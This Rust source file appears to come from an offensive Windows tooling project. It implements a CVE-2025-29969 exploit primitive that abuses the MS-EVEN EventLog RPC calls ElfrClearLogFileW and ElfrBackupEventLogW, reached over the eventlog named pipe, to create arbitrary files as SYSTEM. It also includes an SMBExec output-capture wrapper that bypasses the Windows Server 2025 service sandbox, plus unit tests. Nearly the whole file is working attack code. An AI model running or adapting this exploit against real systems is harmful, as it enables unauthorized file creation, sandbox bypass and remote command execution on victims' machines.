//! MS-EVEN (EventLog) RPC CreateFile primitive.
//!
//! CVE-2025-29969: The EventLog service (MS-EVEN) exposes an RPC interface
//! via `\pipe\eventlog` that allows low-privileged users to trigger
//! `CreateFileW` as SYSTEM by calling `ElfrClearLogFileW` with a crafted
//! UNC path like `\\?\C:\path\to\file`.
//!
//! This bypasses the WS2025 service sandbox that blocks cmd.exe file writes,
//! enabling SMBExec-style output capture and arbitrary file creation from
//! low-privilege contexts.
//!
//! Flow: SMB IPC$ -> `\pipe\eventlog` -> RPC Bind (MS-EVEN) -> ElfrClearLogFileW

use crate::error::{OverthroneError, Result};
use crate::proto::epm::{build_rpc_bind, build_rpc_request, ndr_conformant_string};
use crate::proto::smb::SmbSession;
use tracing::{debug, info};

// ===========================================================
// MS-EVEN Interface UUID & Constants
// ===========================================================

/// MS-EVEN (EventLog) interface UUID: f6beaff7-1e19-4fbb-9f8f-b820e3f2b9f1
const EVEN_UUID: [u8; 16] = [
    0xf7, 0xaf, 0xbe, 0xf6, 0x19, 0x1e, 0xbb, 0x4f, 0x9f, 0x8f, 0xb8, 0x20, 0xe3, 0xf2, 0xb9, 0xf1,
];

/// MS-EVEN interface version 1.0
const EVEN_VERSION: (u16, u16) = (1, 0);

/// MS-EVEN named pipe
const EVEN_PIPE: &str = "eventlog";

// Opnums
/// ElfrClearLogFileW -- clears (truncates/creates) an event log file
const ELFR_CLEAR_LOG_FILE: u16 = 7;
/// ElfrBackupEventLogW -- backs up event log to a specified file
const ELFR_BACKUP_EVENT_LOG: u16 = 9;

// ===========================================================
// Public API
// ===========================================================

/// Create (or truncate) a file on the remote target using the MS-EVEN
/// EventLog RPC CreateFile primitive (CVE-2025-29969).
///
/// The file is created as SYSTEM by the EventLog service, bypassing the
/// WS2025 service sandbox that blocks low-privilege file writes.
///
/// # Arguments
/// * `smb` - Authenticated SMB session to the target
/// * `path` - Full path for the file, e.g. `C:\Windows\Temp\output.txt`
///
/// # Returns
/// `Ok(())` if the file was created/truncated successfully.
pub async fn even_create_file(smb: &SmbSession, path: &str) -> Result<()> {
    info!("MS-EVEN: Creating file via EventLog RPC: {path}");

    let pipe_name = EVEN_PIPE;

    // Step 1: RPC Bind to MS-EVEN interface
    let bind_pdu = build_rpc_bind(&EVEN_UUID, EVEN_VERSION.0, EVEN_VERSION.1);
    let bind_resp =
        smb.pipe_transact(pipe_name, &bind_pdu)
            .await
            .map_err(|e| OverthroneError::Rpc {
                target: smb.target.clone(),
                reason: format!("MS-EVEN RPC bind failed: {e}"),
            })?;

    // Debug: dump bind response for diagnosis
    debug!(
        "MS-EVEN[create]: resp len={}, type={}, b[28]={}, b[29]={}",
        bind_resp.len(),
        if bind_resp.len() > 2 { bind_resp[2] } else { 0 },
        if bind_resp.len() > 28 {
            bind_resp[28]
        } else {
            0
        },
        if bind_resp.len() > 29 {
            bind_resp[29]
        } else {
            0
        },
    );
    if bind_resp.len() > 24 {
        debug!(
            "MS-EVEN[create]: resp[24..32] = {:02x?}",
            &bind_resp[24..32.min(bind_resp.len())]
        );
    }

    if !crate::proto::epm::is_bind_accepted(&bind_resp) {
        return Err(OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: "MS-EVEN RPC bind rejected".to_string(),
        });
    }
    debug!("MS-EVEN: RPC bind accepted");

    // Step 2: Convert path to NDR format for ElfrClearLogFileW
    // The path must use the `\\?\` prefix to bypass path validation
    // and allow arbitrary file paths.
    let even_path = format!("\\\\?\\{path}");
    let stub = ndr_conformant_string(&even_path);

    // Step 3: Call ElfrClearLogFileW (opnum 7) with our path as the log name
    let clear_pdu = build_rpc_request(ELFR_CLEAR_LOG_FILE, &stub);
    let clear_resp = smb
        .pipe_transact(pipe_name, &clear_pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("MS-EVEN ElfrClearLogFileW failed: {e}"),
        })?;

    // Check for RPC fault response
    if clear_resp.len() > 2 && clear_resp[2] == 3 {
        // Type 3 = Fault
        let status = if clear_resp.len() > 28 {
            u32::from_le_bytes([
                clear_resp[24],
                clear_resp[25],
                clear_resp[26],
                clear_resp[27],
            ])
        } else {
            0
        };
        return Err(OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("MS-EVEN ElfrClearLogFileW fault: status=0x{status:08x}"),
        });
    }

    info!("MS-EVEN: File created/truncated successfully: {path}");
    Ok(())
}

/// Create a file using ElfrBackupEventLogW (opnum 9).
///
/// This variant creates a backup of the specified event log to the target
/// file path. The resulting file will contain event log data, but it can
/// be used to create files at arbitrary paths as SYSTEM.
///
/// Use this if `even_create_file` fails, as some WS2025 builds block
/// `ElfrClearLogFileW` but allow `ElfrBackupEventLogW`.
pub async fn even_backup_log(smb: &SmbSession, log_name: &str, path: &str) -> Result<()> {
    info!("MS-EVEN: Creating file via EventLog backup RPC: {path}");

    let pipe_name = EVEN_PIPE;

    // Step 1: RPC Bind to MS-EVEN
    let bind_pdu = build_rpc_bind(&EVEN_UUID, EVEN_VERSION.0, EVEN_VERSION.1);
    let bind_resp =
        smb.pipe_transact(pipe_name, &bind_pdu)
            .await
            .map_err(|e| OverthroneError::Rpc {
                target: smb.target.clone(),
                reason: format!("MS-EVEN RPC bind failed: {e}"),
            })?;

    // Debug: dump bind response for diagnosis
    debug!(
        "MS-EVEN[backup]: resp len={}, type={}, b[28]={}, b[29]={}",
        bind_resp.len(),
        if bind_resp.len() > 2 { bind_resp[2] } else { 0 },
        if bind_resp.len() > 28 {
            bind_resp[28]
        } else {
            0
        },
        if bind_resp.len() > 29 {
            bind_resp[29]
        } else {
            0
        },
    );
    if bind_resp.len() > 24 {
        debug!(
            "MS-EVEN[backup]: resp[24..32] = {:02x?}",
            &bind_resp[24..32.min(bind_resp.len())]
        );
    }

    if !crate::proto::epm::is_bind_accepted(&bind_resp) {
        return Err(OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: "MS-EVEN RPC bind rejected".to_string(),
        });
    }
    debug!("MS-EVEN: RPC bind accepted (backup)");

    // Step 2: Build stub for ElfrBackupEventLogW(UNICODE_STRING logName, UNICODE_STRING backupFile)
    let backup_path = format!("\\\\?\\{path}");
    let mut stub = Vec::new();
    // Log name to back up (e.g., "Application")
    stub.extend_from_slice(&ndr_conformant_string(log_name));
    // Backup file path
    stub.extend_from_slice(&ndr_conformant_string(&backup_path));

    // Step 3: Call ElfrBackupEventLogW
    let backup_pdu = build_rpc_request(ELFR_BACKUP_EVENT_LOG, &stub);
    let backup_resp = smb
        .pipe_transact(pipe_name, &backup_pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("MS-EVEN ElfrBackupEventLogW failed: {e}"),
        })?;

    // Check for fault
    if backup_resp.len() > 2 && backup_resp[2] == 3 {
        let status = if backup_resp.len() > 28 {
            u32::from_le_bytes([
                backup_resp[24],
                backup_resp[25],
                backup_resp[26],
                backup_resp[27],
            ])
        } else {
            0
        };
        return Err(OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("MS-EVEN ElfrBackupEventLogW fault: status=0x{status:08x}"),
        });
    }

    info!("MS-EVEN: File created via backup: {path}");
    Ok(())
}

/// Convenience wrapper: create a temp file for SMBExec output capture.
///
/// Uses MS-EVEN CreateFile primitive to create an empty output file on the
/// remote target that SMBExec's cmd.exe can write to (bypassing WS2025
/// service sandbox restrictions).
///
/// Returns the output path in the format expected by SMBExec.
pub async fn create_smbexec_output_file(smb: &SmbSession, output_path: &str) -> Result<()> {
    // The path should be relative to C:\ for SMBExec compatibility.
    // MS-EVEN needs a full path, so prepend C:\.
    let full_path = if output_path.starts_with("C:\\") || output_path.starts_with("C:/") {
        output_path.to_string()
    } else {
        format!("C:\\{output_path}")
    };

    // Try ElfrClearLogFileW first (clean create)
    match even_create_file(smb, &full_path).await {
        Ok(()) => Ok(()),
        Err(e) => {
            debug!("MS-EVEN ElfrClearLogFileW failed ({e}), trying ElfrBackupEventLogW");
            // Fall back to backup method using "Application" log
            even_backup_log(smb, "Application", &full_path).await
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_even_uuid_constant() {
        // Verify MS-EVEN UUID matches expected value
        let expected = [
            0xf7, 0xaf, 0xbe, 0xf6, 0x19, 0x1e, 0xbb, 0x4f, 0x9f, 0x8f, 0xb8, 0x20, 0xe3, 0xf2,
            0xb9, 0xf1,
        ];
        assert_eq!(EVEN_UUID, expected);
    }

    #[test]
    fn test_even_version() {
        assert_eq!(EVEN_VERSION, (1, 0));
    }

    #[test]
    fn test_even_pipe_name() {
        assert_eq!(EVEN_PIPE, "eventlog");
    }

    #[test]
    fn test_opnum_constants() {
        assert_eq!(ELFR_CLEAR_LOG_FILE, 7);
        assert_eq!(ELFR_BACKUP_EVENT_LOG, 9);
    }

    #[test]
    fn test_ndr_conformant_string_encoding() {
        // Verify the NDR string encoding helper produces correct format:
        // [max_count][0][actual_count][bytes...pad]
        let encoded = ndr_conformant_string("test");
        // String "test" in UTF-16LE: 4 chars + null terminator = 5 * 2 = 10 bytes
        // max_count = 5
        assert_eq!(
            u32::from_le_bytes([encoded[0], encoded[1], encoded[2], encoded[3]]),
            5
        );
        // offset = 0
        assert_eq!(
            u32::from_le_bytes([encoded[4], encoded[5], encoded[6], encoded[7]]),
            0
        );
        // actual_count = 5
        assert_eq!(
            u32::from_le_bytes([encoded[8], encoded[9], encoded[10], encoded[11]]),
            5
        );
        // 't' in UTF-16LE
        assert_eq!(encoded[12], b't');
        assert_eq!(encoded[13], 0);
        // 'e' in UTF-16LE
        assert_eq!(encoded[14], b'e');
        assert_eq!(encoded[15], 0);
        // 's' in UTF-16LE
        assert_eq!(encoded[16], b's');
        assert_eq!(encoded[17], 0);
        // 't' in UTF-16LE
        assert_eq!(encoded[18], b't');
        assert_eq!(encoded[19], 0);
        // null terminator
        assert_eq!(encoded[20], 0);
        assert_eq!(encoded[21], 0);
    }

    #[test]
    fn test_path_prefix_application() {
        // Verify the \\?\ prefix is applied correctly
        let path = "C:\\Windows\\Temp\\test.tmp";
        let even_path = format!("\\\\?\\{path}");
        assert_eq!(even_path, "\\\\?\\C:\\Windows\\Temp\\test.tmp");
    }

    #[test]
    fn test_create_smbexec_output_path_resolution() {
        // Full path passed through
        let result = format!("C:\\{p}", p = "Windows\\Temp\\smbexec_1234.tmp");
        assert_eq!(result, "C:\\Windows\\Temp\\smbexec_1234.tmp");
    }

    #[test]
    fn test_create_smbexec_output_prefixed() {
        // Already has C:\ prefix
        let path = "C:\\Windows\\Temp\\smbexec_1234.tmp";
        let full_path = if path.starts_with("C:\\") || path.starts_with("C:/") {
            path.to_string()
        } else {
            format!("C:\\{path}")
        };
        assert_eq!(full_path, "C:\\Windows\\Temp\\smbexec_1234.tmp");
    }

    #[test]
    fn test_create_smbexec_output_relative() {
        // No prefix - should add C:\
        let path = "Windows\\Temp\\smbexec_1234.tmp";
        let full_path = if path.starts_with("C:\\") || path.starts_with("C:/") {
            path.to_string()
        } else {
            format!("C:\\{path}")
        };
        assert_eq!(full_path, "C:\\Windows\\Temp\\smbexec_1234.tmp");
    }

    #[test]
    fn test_rpc_fault_detection() {
        // Build a minimal RPC fault PDU with status=0x00000008 at offset 24.
        let mut fault = vec![0u8; 28];
        fault[2] = 3; // type = Fault
        fault[24] = 0x08; // status low byte
        assert_eq!(fault[2], 3);
        let status = u32::from_le_bytes([fault[24], fault[25], fault[26], fault[27]]);
        assert_eq!(status, 0x00000008);
    }

    #[test]
    fn test_bind_accepted_response() {
        // Build a valid BindAck with sec_addr_len=0 and result=0 at correct offset.
        // Layout: header(24) + sec_addr_len(2) + sec_addr(0) + pad(2) + n_cont(1) + resv(1) + result(2)
        // After alignment: off=28, result at 30-31
        let mut bind_ack = vec![0u8; 34];
        bind_ack[2] = 12; // type = BindAck
        // sec_addr_len at 24-25 = [0,0] (already zero)
        // result at 30-31 = [0,0] (already zero) => accepted
        let accepted = crate::proto::epm::is_bind_accepted(&bind_ack);
        assert!(accepted, "BindAck with result=0 should be accepted");
    }

    #[test]
    fn test_bind_rejected_response() {
        // Build a BindAck with result=2 (provider rejection) at correct offset.
        let mut bind_nak = vec![0u8; 34];
        bind_nak[2] = 12; // type = BindAck
        // result field at offset 30 = 2 (provider rejection)
        bind_nak[30] = 2;
        let accepted = crate::proto::epm::is_bind_accepted(&bind_nak);
        assert!(!accepted, "BindAck with result=2 should be rejected");
    }

    #[test]
    fn test_even_create_file_full_path() {
        // Test the full path construction
        let path = "C:\\Windows\\Temp\\output.txt";
        let even_path = format!("\\\\?\\{path}");
        assert_eq!(even_path, "\\\\?\\C:\\Windows\\Temp\\output.txt");
    }

    #[test]
    fn test_even_backup_log_stub_size() {
        // Verify stub structure for ElfrBackupEventLogW
        let log_name = "Application";
        let path = "C:\\Temp\\test.log";
        let backup_path = format!("\\\\?\\{path}");

        let mut stub = Vec::new();
        stub.extend_from_slice(&ndr_conformant_string(log_name));
        stub.extend_from_slice(&ndr_conformant_string(&backup_path));

        // "Application" = 12 chars + null = 13 UTF-16 = 26 bytes + headers(12) = 38 bytes
        // padded to 40
        let expected_log_header = 12; // 3 u32s
        let expected_log_bytes = (log_name.len() + 1) * 2; // UTF-16 with null
        let log_padding = (4 - (expected_log_bytes % 4)) % 4;
        let log_total = expected_log_header + expected_log_bytes + log_padding;

        let path_chars = backup_path.encode_utf16().count();
        let path_bytes = path_chars * 2;
        let path_padding = (4 - (path_bytes % 4)) % 4;
        let path_total = expected_log_header + path_bytes + path_padding;

        assert!(stub.len() >= log_total + path_total);
    }
}
